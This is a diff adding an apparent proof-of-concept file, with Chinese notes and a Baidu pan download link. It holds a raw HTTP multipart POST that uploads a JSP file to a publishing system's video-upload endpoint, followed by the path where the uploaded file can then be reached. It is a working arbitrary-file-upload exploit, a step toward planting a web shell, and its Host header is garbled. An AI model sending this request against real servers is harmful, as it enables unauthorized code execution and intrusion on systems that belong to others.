@@ -1,0 +1,26 @@
+该poc来自链接：https://pan.baidu.com/s/1wZoSo30EXiw9vMQBPtKFWg?pwd=zyxa 
+提取码：zyxa
+详情自行查看
+
+POST /publishing/publishing/material/file/video HTTP/1.1
+Host: UserAgent:Mozilla/5.0(Macintosh;IntelMacOSX10_14_3)AppleWebKit/605.1.15(KHTML,likeGecko)Version/12.0.3Safari/605.1.15
+Content-Length:804
+Content-Type:multipart/form-data;boundary=dd8f988919484abab3816881c55272a7
+Accept-Encoding:gzip,deflate
+Connection:close
+
+--dd8f988919484abab3816881c55272a7
+Content-Disposition:form-data;name="Filedata";filename="Test.jsp"
+
+Test
+--dd8f988919484abab3816881c55272a7
+Content-Disposition:form-data;name="Submit"
+
+submit
+--dd8f988919484abab3816881c55272a7--
+
+
+
+
+路径
+/publishingImg/VIDEO/230812152005170200.jsp
